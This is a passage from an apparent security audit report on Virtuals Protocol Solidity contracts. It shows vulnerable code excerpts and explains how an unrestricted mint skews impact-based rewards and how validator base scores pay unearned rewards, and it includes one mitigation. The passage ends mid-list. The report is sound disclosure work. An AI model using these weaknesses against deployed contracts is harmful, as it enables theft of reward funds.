<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">datasetId</span><span class="mtk1"> = </span><span class="mtk11">IContributionNft</span><span class="mtk1">(</span><span class="mtk12">contributionNft</span><span class="mtk1">).</span><span class="mtk11">getDatasetId</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);     &lt;&lt;@ -- </span><span class="mtk3">// Incorrect datasetId</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_impacts</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">] = </span><span class="mtk12">rawImpact</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">datasetId</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_impacts</span><span class="mtk1">[</span><span class="mtk12">datasetId</span><span class="mtk1">] = (</span><span class="mtk12">rawImpact</span><span class="mtk1"> * </span><span class="mtk12">datasetImpactWeight</span><span class="mtk1">) / </span><span class="mtk7">10000</span><span class="mtk1">;                &lt;&lt;@ -- </span><span class="mtk3">// Incorrect impact calculated</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_impacts</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">] = </span><span class="mtk12">rawImpact</span><span class="mtk1"> - </span><span class="mtk12">_impacts</span><span class="mtk1">[</span><span class="mtk12">datasetId</span><span class="mtk1">];                         &lt;&lt;@ -- </span><span class="mtk3">// Incorrect impact calculated</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">SetServiceScore</span><span class="mtk1">(</span><span class="mtk12">datasetId</span><span class="mtk1">, </span><span class="mtk12">_maturities</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">], </span><span class="mtk12">_impacts</span><span class="mtk1">[</span><span class="mtk12">datasetId</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_maturities</span><span class="mtk1">[</span><span class="mtk12">datasetId</span><span class="mtk1">] = </span><span class="mtk12">_maturities</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>This clearly breaks three functionalities:</p>
<ol>
<li>The <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV2.sol#L252"><code>AgentRewardV2::_distributeContributorRewards</code></a> uses <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L120"><code>ServiceNft::getImpact</code></a> call for calculating rewards; hence, allowing to gain higher rewards or provide lesser rewards to the rest.</li>
</ol>
<pre data-index="18" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_distributeContributorRewards</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        RewardSettingsCheckpoints.RewardSettings </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">settings</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">private</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">services</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">serviceId</span><span class="mtk1"> = </span><span class="mtk12">services</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">impact</span><span class="mtk1"> = </span><span class="mtk12">serviceNftContract</span><span class="mtk1">.</span><span class="mtk11">getImpact</span><span class="mtk1">(</span><span class="mtk12">serviceId</span><span class="mtk1">);           &lt;&lt;@ -- </span><span class="mtk3">// Uses getImpact</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">impact</span><span class="mtk1"> == </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk15">continue</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">ServiceReward</span><span class="mtk1"> </span><span class="mtk12">storage</span><span class="mtk1"> </span><span class="mtk12">serviceReward</span><span class="mtk1"> = </span><span class="mtk12">_serviceRewards</span><span class="mtk1">[</span><span class="mtk12">serviceId</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">serviceReward</span><span class="mtk1">.</span><span class="mtk12">impact</span><span class="mtk1"> == </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">serviceReward</span><span class="mtk1">.</span><span class="mtk12">impact</span><span class="mtk1"> = </span><span class="mtk12">impact</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_rewardImpacts</span><span class="mtk1">[</span><span class="mtk12">reward</span><span class="mtk1">.</span><span class="mtk12">id</span><span class="mtk1">][</span><span class="mtk12">serviceNftContract</span><span class="mtk1">.</span><span class="mtk11">getCore</span><span class="mtk1">(</span><span class="mtk12">serviceId</span><span class="mtk1">)] += </span><span class="mtk12">impact</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . . </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<ol start="2">
<li>The <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/token/Minter.sol#L134"><code>Minter::mint</code></a> uses the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L120"><code>ServiceNft::getImpact</code></a> call to transfer tokens; hence, leading to excess or lower funds being transferred.</li>
</ol>
<pre data-index="19" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">nftId</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">noReentrant</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">finalImpactMultiplier</span><span class="mtk1"> = </span><span class="mtk11">_getImpactMultiplier</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">datasetId</span><span class="mtk1"> = </span><span class="mtk12">contribution</span><span class="mtk1">.</span><span class="mtk11">getDatasetId</span><span class="mtk1">(</span><span class="mtk12">nftId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">impact</span><span class="mtk1"> = </span><span class="mtk11">IServiceNft</span><span class="mtk1">(</span><span class="mtk12">serviceNft</span><span class="mtk1">).</span><span class="mtk11">getImpact</span><span class="mtk1">(</span><span class="mtk12">nftId</span><span class="mtk1">);          &lt;&lt;@ -- </span><span class="mtk3">// Uses getImpact</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">impact</span><span class="mtk1"> &gt; </span><span class="mtk12">maxImpact</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">impact</span><span class="mtk1"> = </span><span class="mtk12">maxImpact</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1"> = (</span><span class="mtk12">impact</span><span class="mtk1"> * </span><span class="mtk12">finalImpactMultiplier</span><span class="mtk1"> * </span><span class="mtk7">10</span><span class="mtk1"> ** </span><span class="mtk7">18</span><span class="mtk1">) / </span><span class="mtk12">DENOM</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">dataAmount</span><span class="mtk1"> = </span><span class="mtk12">datasetId</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            ? (</span><span class="mtk11">IServiceNft</span><span class="mtk1">(</span><span class="mtk12">serviceNft</span><span class="mtk1">).</span><span class="mtk11">getImpact</span><span class="mtk1">(</span><span class="mtk12">datasetId</span><span class="mtk1">) * </span><span class="mtk12">finalImpactMultiplier</span><span class="mtk1"> * </span><span class="mtk7">10</span><span class="mtk1"> ** </span><span class="mtk7">18</span><span class="mtk1">) / </span><span class="mtk12">DENOM</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            : </span><span class="mtk7">0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<ol start="3">
<li><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L179"><code>AgentDAO::_calcMaturity</code></a> uses <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L124"><code>ContributionNft::getCore</code></a> which would calculate incorrect core allowing to manipulate <code>coreService</code>:</li>
</ol>
<pre data-index="20" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_calcMaturity</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk12">uint8</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">votes</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">contributionNft</span><span class="mtk1"> = </span><span class="mtk11">IAgentNft</span><span class="mtk1">(</span><span class="mtk12">_agentNft</span><span class="mtk1">).</span><span class="mtk11">getContributionNft</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">serviceNft</span><span class="mtk1"> = </span><span class="mtk11">IAgentNft</span><span class="mtk1">(</span><span class="mtk12">_agentNft</span><span class="mtk1">).</span><span class="mtk11">getServiceNft</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1"> = </span><span class="mtk11">IContributionNft</span><span class="mtk1">(</span><span class="mtk12">contributionNft</span><span class="mtk1">).</span><span class="mtk11">tokenVirtualId</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint8</span><span class="mtk1"> </span><span class="mtk12">core</span><span class="mtk1"> = </span><span class="mtk11">IContributionNft</span><span class="mtk1">(</span><span class="mtk12">contributionNft</span><span class="mtk1">).</span><span class="mtk11">getCore</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);                 &lt;&lt;@ -- </span><span class="mtk3">// Hence, calculating incorrect core.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">coreService</span><span class="mtk1"> = </span><span class="mtk11">IServiceNft</span><span class="mtk1">(</span><span class="mtk12">serviceNft</span><span class="mtk1">).</span><span class="mtk11">getCoreService</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">core</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// All services start with 100 maturity</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">maturity</span><span class="mtk1"> = </span><span class="mtk7">100</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">coreService</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">maturity</span><span class="mtk1"> = </span><span class="mtk11">IServiceNft</span><span class="mtk1">(</span><span class="mtk12">serviceNft</span><span class="mtk1">).</span><span class="mtk11">getMaturity</span><span class="mtk1">(</span><span class="mtk12">coreService</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">maturity</span><span class="mtk1"> = </span><span class="mtk11">IEloCalculator</span><span class="mtk1">(</span><span class="mtk11">IAgentNft</span><span class="mtk1">(</span><span class="mtk12">_agentNft</span><span class="mtk1">).</span><span class="mtk11">getEloCalculator</span><span class="mtk1">()).</span><span class="mtk11">battleElo</span><span class="mtk1">(</span><span class="mtk12">maturity</span><span class="mtk1">, </span><span class="mtk12">votes</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">maturity</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<h3 style="position:relative;" id="recommended-mitigation-steps-3"><a class="anchor before" aria-label="recommended mitigation steps 3 permalink" href="#recommended-mitigation-steps-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Due to lack of documentation, from my personal understanding the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L33">comment</a> helps in inferring that the function was meant to be guarded:</p>
<pre data-index="21" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">private</span><span class="mtk1"> </span><span class="mtk12">_admin</span><span class="mtk1">; </span><span class="mtk3">// Admin is able to create contribution proposal without votes</span></span></span></code></pre>
<p>Allowing only an operator or admin to call the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L65"><code>ContributionNft::mint</code></a> should mitigate the issue:</p>
<pre data-index="22" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">require(_msgSender() == _admin, "Only admin can set elo calculator");</span></span></code></pre>
<pre data-index="23" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    function mint(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        address to,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 virtualId,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint8 coreId,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        string memory newTokenURI,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 proposalId,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 parentId,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        bool isModel_,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        uint256 datasetId</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) external returns (uint256) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+       require(_msgSender() == _admin, "Only admin can mint tokens"); </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        IGovernor personaDAO = getAgentDAO(virtualId);</span></span></span></code></pre>
<p><strong>Virtuals marked as informative</strong></p>
<hr>
<h2 style="position:relative;" id="h-05-validatorregistryvalidatorscoregetpastvalidatorscore-allows-validator-to-earn-full-rewards-without-actually-engaging-with-the-protocol"><a class="anchor before" aria-label="h 05 validatorregistryvalidatorscoregetpastvalidatorscore allows validator to earn full rewards without actually engaging with the protocol permalink" href="#h-05-validatorregistryvalidatorscoregetpastvalidatorscore-allows-validator-to-earn-full-rewards-without-actually-engaging-with-the-protocol"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-83">[H-05] <code>ValidatorRegistry::validatorScore/getPastValidatorScore</code> allows validator to earn full rewards without actually engaging with the protocol</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-778">oakcobalt</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-188">danzero</a> and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-775">YouCrossTheLineAlfie</a></em></p>
<p>The <code>ValidatorRegistry::_initValidatorScore</code> function initializes new validators with a base score equal to the total number of proposals that have ever existed, allowing validators to earn full rewards without actually participating in the protocol.</p>
<h3 style="position:relative;" id="vulnerabilities"><a class="anchor before" aria-label="vulnerabilities permalink" href="#vulnerabilities"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Vulnerabilities</h3>
<p>When a new validator is added via <code>addValidator()</code>, their base score is set to <code>_getMaxScore(virtualId)</code> which is implemented as <code>totalProposals(virtualId)</code> in AgentNftV2:</p>
<pre data-index="24" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_initValidatorScore</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">validator</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_baseValidatorScore</span><span class="mtk1">[</span><span class="mtk12">validator</span><span class="mtk1">][</span><span class="mtk12">virtualId</span><span class="mtk1">] = </span><span class="mtk11">_getMaxScore</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L37">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L37</a></p>
<p>This base score is then added to the validator’s actual participation score in the <code>validatorScore</code> and <code>getPastValidatorScore</code> functions:</p>
<pre data-index="25" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">validatorScore</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">validator</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">return</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_baseValidatorScore</span><span class="mtk1">[</span><span class="mtk12">validator</span><span class="mtk1">][</span><span class="mtk12">virtualId</span><span class="mtk1">] +</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_getScoreOf</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">validator</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L41">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L41</a></p>
<pre data-index="26" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">getPastValidatorScore</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">validator</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">timepoint</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">_baseValidatorScore</span><span class="mtk1">[</span><span class="mtk12">validator</span><span class="mtk1">][</span><span class="mtk12">virtualId</span><span class="mtk1">] + </span><span class="mtk11">_getPastScore</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">validator</span><span class="mtk1">, </span><span class="mtk12">timepoint</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L49">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L49</a></p>
<p>In AgentRewardV2, rewards are distributed based on participation rate calculated as <code>(validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals</code>, meaning validators with artificially inflated scores receive unearned rewards.</p>
<p>This allows two exploit scenarios:</p>
<ol>
<li>New validators can earn full rewards without ever voting on proposals:
